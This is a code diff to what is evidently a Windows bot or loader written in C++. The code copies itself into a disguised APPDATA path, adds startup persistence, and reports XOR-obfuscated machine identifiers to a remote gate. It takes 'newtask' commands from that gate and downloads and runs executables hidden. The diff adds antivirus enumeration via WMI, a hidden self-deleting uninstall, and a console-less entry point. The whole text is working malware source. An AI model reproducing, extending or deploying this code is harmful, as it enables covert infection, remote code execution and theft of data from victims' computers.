@@ -9,9 +9,13 @@
 #include <vector>
 #include <thread>
 #include <ShellAPI.h>
+#include <wbemidl.h>
+#include "config.h"
+#include <conio.h>
+#include <atlbase.h>
 #pragma comment( lib, "Urlmon.lib" )
 #pragma comment(lib, "netapi32.lib")
-
+#pragma comment(lib,"wbemuuid")
 
 std::string responseToString(http::Response response) {
 	char* gateFromPatebin = (char*)malloc(response.body.size() + 1);
@@ -24,8 +28,12 @@ std::string responseToString(http::Response response) {
 
 std::string getHWID() {
 	HW_PROFILE_INFO hwProfileInfo;
-	if (GetCurrentHwProfile(&hwProfileInfo))
+	if (GetCurrentHwProfile(&hwProfileInfo)) {
 		return (std::string)hwProfileInfo.szHwProfileGuid;
+	}
+	else {
+		return "unknow";
+	}
 }
 
 std::string getComputerName() {
@@ -85,7 +93,7 @@ bool replace(std::string& str, const std::string& from, const std::string& to) {
 }
 
 std::string RandomString(int len) {
-	srand(time(0));
+	srand((unsigned int)time(NULL));
 	std::string str = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
 	std::string newstr;
 	int pos;
@@ -97,12 +105,15 @@ std::string RandomString(int len) {
 }
 
 
+
+
 std::string startNewProcess(std::string file) {
 	STARTUPINFO si = {};
 	si.cb = sizeof si;
 
 	PROCESS_INFORMATION pi = {};
 	const TCHAR* target = TEXT(file.c_str());
+	
 
 	if (!CreateProcess(target, 0, 0, FALSE, 0, 0, 0, 0, &si, &pi))
 	{
@@ -228,17 +239,25 @@ void removeRegInstallKey(){
 
 void uninstall() {
 	removeRegInstallKey();
-	std::string remove = "START /B CMD.EXE /D /C \"PING.EXE -n 5 127.0.0.1 && del "+ ExePath()+"\"";
-	std::cout << remove;
-	system(remove.c_str());
+	std::string remove = " /C \"PING.EXE -n 5 127.0.0.1 && del "+ ExePath()+"\"";
+	//ShellExecute(GetDesktopWindow(), "open", remove.c_str(), NULL, NULL, SW_SHOWNORMAL);
+	ShellExecute(
+		NULL,
+		_T("open"),
+		_T("cmd"),
+		_T( remove.c_str() ), // params                            
+		_T(" C:\ "),
+		SW_HIDE);
+	//std::string remove = "START /B CMD.EXE /D /C \"PING.EXE -n 5 127.0.0.1 && del "+ ExePath()+"\"";
+	//std::cout << remove;
+	//system(remove.c_str());
 }
 
 
 void update(std::string url) {
-	removeRegInstallKey();
 	std::string file((std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\" + RandomString(10) + ".exe");
 	downloadFile(url, file);
-	ShellExecute(GetDesktopWindow(), "open", file.c_str(), NULL, NULL, SW_SHOWNORMAL);
+	ShellExecute(GetDesktopWindow(), "open", file.c_str(), NULL, NULL, SW_HIDE);
 	uninstall();
 }
 
@@ -254,11 +273,31 @@ std::string checkIfRegKeyExists(std::string key) {
 	return "true";
 }
 
+
+std::string GetMachineGUID()
+{
+	std::string ret;
+	char value[64];
+	DWORD size = _countof(value);
+	DWORD type = REG_SZ;
+	HKEY key;
+	LONG retKey = ::RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &key);
+	LONG retVal = ::RegQueryValueExA(key, "MachineGuid", nullptr, &type, (LPBYTE)value, &size);
+	if (retKey == ERROR_SUCCESS && retVal == ERROR_SUCCESS) {
+		ret = value;
+	}
+	::RegCloseKey(key);
+	return ret;
+}
+
 std::string installedOrnot() {
 	//Kill Current Place
-	std::string installPath = (std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\system32.exe";
+	std::string installPath = (std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\" + RandomString(10) + ".exe";
 	//Check if Appdata Dir 
-	if (installPath != ExePath()) {
+	size_t found = ExePath().find("Microsoft");
+	if ( found  != std::string::npos) {
+		return "installed";
+	}else {
 		//Uninstalled Copy To AppData & Execute
 		BOOL b = CopyFile(ExePath().c_str(), installPath.c_str(), 0);
 		if (!b) {
@@ -272,35 +311,82 @@ std::string installedOrnot() {
 		system(rebootString.c_str());
 		return "restart";
 	}
-	return "installed";
 }
 
+void avList() {
+	CoInitializeEx(0, 0);
+	CoInitializeSecurity(0, -1, 0, 0, 0, 3, 0, 0, 0);
+	IWbemLocator *locator = 0;
+	CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (void **)&locator);
+	IWbemServices * services = 0;
+	wchar_t *name = L"root\\SecurityCenter2";
+	if (SUCCEEDED(locator->ConnectServer(name, 0, 0, 0, 0, 0, 0, &services))) {
+		printf("Connected!\n");
+		//Lets get system information
+		CoSetProxyBlanket(services, 10, 0, 0, 3, 3, 0, 0);
+		wchar_t *query = L"Select * From AntiVirusProduct";
+		IEnumWbemClassObject *e = 0;
+		if (SUCCEEDED(services->ExecQuery(L"WQL", query, WBEM_FLAG_FORWARD_ONLY, 0, &e))) {
+			printf("Query executed successfuly!\n");
+			IWbemClassObject *object = 0;
+			ULONG u = 0;
+			//lets enumerate all data from this table
+
+			std::string antiVirus;
+
+			while (e) {
+				e->Next(WBEM_INFINITE, 1, &object, &u);
+				if (!u) break;//no more data,end enumeration
+				CComVariant cvtVersion;
+				object->Get(L"displayName", 0, &cvtVersion, 0, 0);
+				std::wcout << cvtVersion.bstrVal << std::endl;
+			}
+		}
+		else
+			printf("Error executing query!\n");
+	}
+	else
+		printf("Connection error!\n");
+	//Close all used data
+	services->Release();
+	locator->Release();
+	CoUninitialize();
+	_getch();
+
+}
 
 std::string encryptDecrypt(std::string toEncrypt) {
-	char key[3] = { 'K', 'C', 'Q' }; //Any chars will work
+	char key[3] = {'K', 'C', 'Q'}; //Any chars will work
 	std::string output = toEncrypt;
 
 	for (int i = 0; i < toEncrypt.size(); i++)
 		output[i] = toEncrypt[i] ^ key[i % (sizeof(key) / sizeof(char))];
 
 	return output;
-
 }
 
 
 
 
 
-//int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd){
-int main(int argc, char *argv[]) {
+int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd){
+//int main(int argc, char *argv[]) {
+	
+
+
+	//avList();
+	
 	
 	std::string insatlled = installedOrnot();
 	if (insatlled == "restart") {
 		std::cout << "restart program";
 		return 0;
 	}
+	
 	addstartup();
 	
+	//uninstall();
+	//return 0;
 
 	//std::cout << encryptDecrypt(getComputerName());
 	//std::cout << encryptDecrypt(encryptDecrypt(getComputerName()));
@@ -318,7 +404,7 @@ int main(int argc, char *argv[]) {
 		try {
 			http::Request request2(gateFromPatebin);
 			http::Response respons2e = request2.send("POST",
-				"hwid=" + getHWID() +
+				"hwid=" + GetMachineGUID() +
 				"&username=" + encryptDecrypt(getComputerName()) +
 				"&nf2=" + encryptDecrypt(netFramework2) +
 				"&nf3=" + encryptDecrypt(netFramework3) +
@@ -329,14 +415,14 @@ int main(int argc, char *argv[]) {
 				{ "Content-Type: application/x-www-form-urlencoded" }
 			);
 			std::string responseFromGate = responseToString(respons2e);
-			//TODO Handle newtask Function
+			//TODO Handle Tasks Function
 			
 			//TODO Get Current AV
 			//Java Support?
 			//32x64 Bit CPU (&& Model?)
 			//Current AV?
 
-
+			std::cout << responseFromGate;
 			std::string substring = "newtask";
 			if (responseFromGate.find(substring) != std::string::npos) {
 				std::vector<std::string> v = explode(";", responseFromGate);
